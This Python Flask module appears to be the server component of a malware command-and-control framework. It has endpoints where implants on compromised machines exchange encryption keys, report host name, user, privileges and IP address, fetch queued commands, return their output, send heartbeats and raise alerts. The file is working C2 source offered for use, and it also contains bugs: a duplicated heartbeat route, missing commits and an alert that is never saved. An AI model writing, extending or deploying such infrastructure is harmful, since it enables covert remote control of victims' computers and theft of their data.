import functools
import json
import binascii
from datetime import datetime
from msilib.schema import Error


from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, jsonify
)
from sqlalchemy.exc import IntegrityError
from werkzeug.security import check_password_hash, generate_password_hash

from .db import db
from .models import Implant, Command, Alert
from .encryptor import EncryptDecryptFile, GetImpPubKey
bp = Blueprint('implant', __name__)

# register

@bp.route('/key_gen', methods=['POST'])
def gen_key():
    print(request.json)
    computer_guid = request.json['computer_guid']
    key = request.json['data']
    decryptor = GetImpPubKey("server")
    implant = Implant.query.filter_by(computer_guid=computer_guid).first()
    data = request.json['data']
    pk_imp = decryptor.decrypt(data)
    #print("loooool" ,binascii.hexlify(pk_imp))
    encryptor2 = EncryptDecryptFile('server',pk_imp)
    #extra_data= request.json['extra_data']
    #extra_data = bytes.fromhex(extra_data)
    #nonce = bytes.fromhex(request.json['nonce'])
    #print(extra_data)
    #print("HUUUUUUU",decryptor2.decrypt(extra_data,nonce))
    if implant:
        try:
            now = datetime.now()
            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
            implant.last_seen= current_date_time
            implant.session_key = decryptor.decrypt(data)
            db.session.commit()
            return encryptor2.encrypt(jsonify({"status":"good job"}).data)
        except Exception as e: 
            print("Key share error",e)
            return encryptor2.encrypt(jsonify({"status":"bad -- job"}).data)
    else:
        try:
            now = datetime.now()
            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
            first_seen = current_date_time
            last_seen = current_date_time
            
            implant = Implant(   
                        computer_guid=computer_guid,
                        session_key=decryptor.decrypt(data),
                        first_seen=first_seen,
                        last_seen=last_seen
                    )
            db.session.add(implant)
            db.session.commit()
            return encryptor2.encrypt(jsonify({"status":"Great job"}).data)
        except Exception as e:
            print("Key share error",e)
            return encryptor2.encrypt(jsonify({"status":"bad -- job"}).data)



@bp.route('/register', methods=['POST'])
def register():
    try:
        if request.method == 'POST':

            print( request.json)
            computer_guid = request.json['computer_guid']
            imp_id = request.json['computer_guid']

            data = request.json['data']
            nonce =  request.json['nonce']
            now = datetime.now()
            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")


            error = None

            if not imp_id:
                error = 'Id is required.'

            if error is None:
                try:
                    implant = Implant.query.filter_by(computer_guid=computer_guid).first()

                    
                    
                    if implant:
                        pk = implant.session_key
                        print(pk)
                        decryptor = EncryptDecryptFile('server',pk)
                        dec_data = decryptor.decrypt(data,nonce)
                        dec_data = dec_data.decode('utf-8')
                        data_dict = json.loads(dec_data)
                        cmp_name = data_dict['computer_name']
                        user_name = data_dict['computer_user']
                        computer_guid = data_dict['computer_guid']
                        cmp_prev = data_dict['computer_privileges']
                        ip = data_dict['connecting_ip_address']
                        imp_session_key = data_dict["session_key"]
                        first_seen = current_date_time
                        last_seen = current_date_time
                        implant.computer_name = cmp_name
                        implant.computer_user = user_name
                        implant.last_seen = last_seen
                        implant.computer_privileges=json.dumps(cmp_prev)
                        implant.connecting_ip_address=ip
                        db.session.commit()
                        print("Implant updated")
                        return decryptor.encrypt(jsonify({"status":"good job"}).data)


                    else:
                        print("Implant not added")
                        return jsonify({"status":"Exchange keys first"})
                except Exception as e:
                    print("Register error" , e)

                    return jsonify({"status":"bad job"})

            else:
                return jsonify({"status":"bad job"})


    except Exception as e:
        print("Register error" , e)

        return jsonify({"status":"bad job"})


@bp.route('/getNextCommand', methods=['POST'])
def get_next_command():
    if request.method == 'POST':
        try:
            print( request.json)
            computer_guid = request.json['computer_guid']

            impl_id = request.json["computer_guid"]

            if impl_id:
                implant = Implant.query.filter_by(computer_guid=computer_guid).first()
                pk = implant.session_key
                print(pk)
                decryptor = EncryptDecryptFile('server',pk)

                next_command = Command.query.filter_by(
                    computer_guid=impl_id, status="taken_by_implant").first()
                if not next_command:
                    next_command = Command.query.filter_by(
                    computer_guid=impl_id, status="not_taken_by_implant").first()
                print(next_command)
                if next_command:
                    
                    command = next_command.command_text
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    cmd_id = next_command.command_id
                    next_command.time_issued = current_date_time
                    command_type = next_command.command_type
                    next_command.status = "taken_by_implant"
                    db.session.commit()
                    return decryptor.encrypt(jsonify({"command_id": cmd_id, "command_text": command,"command_type":command_type}).data)
                else:
                    return jsonify({"command_id": "-1", "command_text": "No command","command_type":"gaga"})
            else:
                return jsonify({"command_id": "-1", "command_text": "No command","command_type":"gaga"})
        except Exception as e:
            print(e)

            return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})


@bp.route('/heartbeat', methods=['POST'])
def heartbeat():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            try:
                implant = Implant.query.filter_by(computer_guid=imp_id).first()
                if implant:
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    implant.last_seen = current_date_time
                    return jsonify({"status": "keep Alive"})
                else:
                    return jsonify({"status": "register first"})
            except Exception as e:
                print(e)
                return jsonify({"status": "register first"})

        except Exception as e:
            print(e)
            return jsonify({"status": "register first"})

@bp.route('/sendCommandResult', methods=['POST'])
def store_command_results():
    if request.method == 'POST':
        try:
            impl_id = request.json["computer_guid"]
            data = request.json["data"]
            nonce = request.json["nonce"]

            if impl_id:
                implant = Implant.query.filter_by(computer_guid=impl_id).first()
                if implant:
                    pk = implant.session_key
                    print(pk)
                    decryptor = EncryptDecryptFile('server',pk)
                    dec_data = decryptor.decrypt(data,nonce)
                    dec_data = dec_data.decode('utf-8')
                    data_dict = json.loads(dec_data)




                    cmd_id = data_dict["command_id"]
                    result = data_dict["result"]
                    commands = Command.query.filter_by(computer_guid=impl_id, status="taken_by_implant",
                                                    command_id=cmd_id).first()
                    if commands:
                        commands.command_result = result
                        commands.status = "completed"
                        db.session.commit()
                        return decryptor.encrypt(jsonify({"status": "Result posted"}).data)
                    else:
                        return decryptor.encrypt(jsonify({"status": "Error in posting result"}).data)
                else:
                    return jsonify({"status": "Register first"})

        except Exception as e:
            print(e)

            return jsonify({"status": "Error in posting result"})


@bp.route('/heartbeat', methods=['POST'])
def heartbeat1():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            try:
                implant = Implant.query.filter_by(computer_guid=imp_id).first()
                if implant:
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    implant.last_seen = current_date_time
                    return jsonify({"status": "keep Alive"})
                else:
                    return jsonify({"status": "register first"})

            except Exception as e:
                print(e)

                return jsonify({"status": "register first"})
        except Exception as e:
            print(e)
            return jsonify({"status": "register first"})



@bp.route('/alert', methods=['POST'])
def alert():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            alert = request.json['error']
            try:
                now = datetime.now()
                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                alert = Alert(computer_guid=imp_id,
                              time_reported=current_date_time, alert=alert)

                db.session.commit()
                return jsonify({"status": "Alert Registered"})
            except Exception as e:
                print(e)

                return jsonify({"status": "Bad alert"})
        except Exception as e:
            print(e)
            return jsonify({"status": "Bad alert"})
            pass
